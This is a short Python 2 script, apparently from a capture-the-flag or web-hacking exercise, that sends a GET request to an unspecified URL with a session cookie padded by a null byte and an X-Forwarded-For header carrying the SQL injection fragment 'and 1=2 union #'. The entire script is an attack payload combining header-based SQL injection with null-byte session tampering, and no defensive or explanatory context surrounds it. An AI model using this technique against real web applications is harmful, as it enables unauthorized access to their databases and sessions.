#coding:utf-8
import requests

url = ""
session = "2la59iuktagjo3s1wq78d4t6y0ehpfr" + chr(0) + "e1231d8"
headers = {"X-Forwarded-For": "and 1=2 union #"}
cookie = {"SESSID": session}
re = requests.get(url, cookies=cookie, headers=headers)
print re.content
